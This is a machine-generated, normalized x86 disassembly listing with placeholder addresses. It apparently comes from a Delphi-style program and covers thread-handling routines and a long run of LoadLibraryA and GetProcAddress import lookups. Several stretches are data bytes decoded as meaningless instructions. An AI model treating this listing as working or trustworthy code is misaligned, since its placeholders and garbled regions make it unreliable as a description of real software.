call sub_41a870
mov eax [ r-xdata ]
call sub_45daa0
test al al
je r-xdata
mov edi 0x7d
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x34 ]
mov edx 0x7d
call sub_45d0f8
mov edi eax
jmp r-xdata
cmp edi esi
jge r-xdata
lea esi [ edi + 0x1 ]
test bl bl
je r-xdata
mov eax esi
call sub_45d3f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax edi
call sub_45d3f8
sub esi edi
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a898
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov eax [ ebp - 0x4 ]
call sub_41a8a0
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_404310
test eax eax
jle r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45da5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
lea esi [ edi + 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4629b4
mov eax [ ebp - 0x4 ]
call sub_403294
retn
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
cmp edi esi
jl r-xdata
xor esi esi
jmp r-xdata
sub_4629d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_462ba9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_462db0
mov al [ eax + 0x7c ]
dec eax
sub al 0x3
jae r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4040e8
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_462db0
mov edx [ eax + 0x6c ]
lea eax [ ebp - 0x10 ]
call sub_4040e8
mov eax [ ebp - 0x4 ]
call sub_462db0
mov edi [ eax + 0x74 ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_45b79c
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx edi
call sub_45f48c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
push 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45df38
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_45e268
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_45f1e0
lea eax [ ebx + 0x14 ]
mov edx [ ebp + 0x18 ]
call sub_4040a4
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x24 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x28 ] eax
mov eax ebx
call sub_45f36c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x10 ]
call sub_45bc48
test al al
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_45df38
cmp esi 0xffffffff
je r-xdata
mov eax [ rw-data ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx 0x1
mov edx 0x6
call sub_45f300
mov eax [ r-xdata ]
call sub_45daa0
test al al
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b650
jmp r-xdata
push ebp
mov eax 0x1d4c0
call sub_462864
pop ecx
jmp r-xdata
push ebp
mov eax esi
call sub_462864
pop ecx
mov eax [ ebp - 0x4 ]
call sub_462db0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_45ede0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462bb0
lea eax [ ebp - 0x1c ]
call sub_404050
lea eax [ ebp - 0x10 ]
call sub_404050
retn
sub_462bd0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_45de14
mov [ esi + 0x6c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_462c0c
push ebx
mov ebx eax
mov eax ebx
call sub_45e2a0
mov eax [ ebx + 0x68 ]
test eax eax
jne r-xdata
mov dl 0x1
call sub_45f774
pop ebx
retn
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f544
mov [ ebx + 0x68 ] eax
pop ebx
retn
sub_462c48
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462cb8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_45f2b8
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462cbf
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_462cc8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462d38
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x48 ]
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
push 0x0
mov edx esi
mov ecx edi
mov eax [ ebx + 0x68 ]
call sub_45f2dc
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462d3f
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_462d48
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
mov [ ebx + 0x70 ] esi
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
test eax eax
je r-xdata
mov eax ebx
call sub_462db0
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax esi
mov [ ebx + 0x70 ] eax
mov edx ebx
call sub_41aa14
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_462db0
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
xor eax eax
mov [ ebx + 0x70 ] eax
lea eax [ ebx + 0x70 ]
call sub_40d19c
mov eax [ ebx + 0x70 ]
mov [ eax + 0x80 ] ebx
pop esi
pop ebx
retn
sub_462db0
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x70 ]
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45e590
mov [ ebx + 0x70 ] eax
sub_462dd8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x70 ]
test eax eax
je r-xdata
lea eax [ esi + 0x68 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45e270
test bl bl
jle r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
lea eax [ esi + 0x70 ]
call sub_40d19c
sub_462e1c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x70 ]
jne r-xdata
xor eax eax
mov [ esi + 0x70 ] eax
sub_462e44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403848#4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov edx eax
mov [ ebp - 0xc ] 0x2719
mov [ ebp - 0x8 ] 0x2736
lea ecx [ ebp - 0xc ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b65c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41a898
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462e9e
add [ eax ] eax
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x46 ] dl
add [ eax + eax ] cl
add [ eax ] al
xor [ ebx + 0x34c40045 ] dl
inc eax
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45120040 ] al
dec ecx
push esp
push 0x64616572
inc ebp
js r-xdata
inc eax
add [ edx - 0x76ffb9d2 ] ch
retn
popad
je r-xdata
jo r-xdata
inc edx
popad
jae r-xdata
inc ecx
outsb
add [ eax - 0x2bffbe5b ] dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] ch
movsd [ edi ] [ esi ]
inc ecx
add [ esi + 0x41 ] al
add [ eax + 0xd00402a ] dl
push esp
dec ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax ] dh
inc esi
add [ eax ] al
add [ eax ] al
xchg esp eax
sub [ ecx ] al
les esi [ eax + eax * 2 ]
imul ebp [ edi + 0x6e ] 0x462fb490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0xc0046 ] dh
add [ eax ] al
or [ edi ] ch
inc esi
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x451c0040 ] al
dec ecx
push esp
push 0x64616572
push esp
jb r-xdata
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax + 0x44004633 ] bh
cmpsb [ esi ] [ edi ]
inc ecx
push esp
push 0x64616572
mov eax eax
cmp al 0x30
inc esi
add [ edi ] al
or eax 0x42644954
popad
jae r-xdata
push esp
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] r-xdata
and [ eax ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
xor [ esi ] al
inc eax
add [ eax ] al
add [ eax + ebp + 0x34c40041 ] dl
inc eax
imul ebp [ esi + 0x61 ] 0x6e416574
add [ ecx + esi + 0x31a80046 ] dh
inc esi
add [ eax - 0x53ffb9cf ] dh
xor [ esi ] eax
movsb [ edi ] [ esi ]
xor [ esi ] eax
push 0x44004635
xor eax 0x35300046
inc esi
add [ eax + 0x2000402a ] dl
xor eax [ esi ]
inc esi
add [ esi + 0x41 ] al
push esp
push 0x64616572
and [ eax ] dh
inc esi
add al dh
sub [ ecx ] al
add [ eax ] al
or [ ecx + 0x64 ] cl
push esp
push 0x64616572
add [ eax ] al
lodsb [ esi ]
xor [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_4676a1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bh
xor [ esi ] al
push 0xd4000000
das
inc esi
add ah al
xor al 0x40
add [ eax - 0x2bffbe5b ] dl
sub_462eac
mov eax [ ebp - 0x4 ]
add eax 0x44
mov edx [ ebx + 0x4 ]
call sub_4040a4
call sub_403a84
mov eax [ ebp - 0x4 ]
call sub_41a898
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462ed0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462ef5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462efc
retn
sub_4630d9
xor eax [ esi ]
push eax
xor al 0x46
add [ ebp + esi + 0x46 ] bl
add [ eax ] ch
xor [ esi ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x4c0040 ] ch
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
or [ ecx ] dh
inc esi
add [ edi ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
lodsb [ esi ]
xor [ esi ] al
cmp [ eax ] dh
inc esi
add [ eax ] al
add [ eax ] cl
dec ecx
push esp
push 0x64616572
add [ eax ] al
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_463196
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax ebx
call sub_41a8a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46319d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
call sub_41a870
sub_4631b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403848#7
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4632c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4634b8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4632c9
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
xor eax eax
push ebp
push sub_463298
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_46327b
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4634b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4634b8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463282
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41a7ec
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub_463320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_426030
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push j_sub_40371c#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a458
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4633b8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov [ esi + 0xf ] 0x0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a528
mov eax esi
mov edx [ eax ]
call [ edx + 0x18 ]
lea eax [ esi + 0x44 ]
call sub_40d19c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_4633f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4260b8
xor eax eax
push ebp
push sub_463446
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4634b8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46344d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4260c0
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a7ec
sub_463450
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4260b8
xor eax eax
push ebp
push sub_4634ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4634b8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634b5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4260c0
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
sub al 0x1
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_4634b8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4260b8
xor eax eax
push ebp
push sub_46351b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4260c0
retn
sub_463574
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_463599
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4635a0
retn
sub_4636c8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_46371f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404318
lea eax [ ebp - 0x4 ]
call j_sub_40451c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463726
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_463738
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_463776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4636c8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46377d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_463784
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404500
xor eax eax
push ebp
push sub_4637db
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404318
lea eax [ ebp - 0x4 ]
call j_sub_40451c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4637e2
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_4637f4
push ebx
mov bl 0x1
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax ebx
pop ebx
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463738
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_463784
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
mov eax r-xdata
call sub_4636c8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
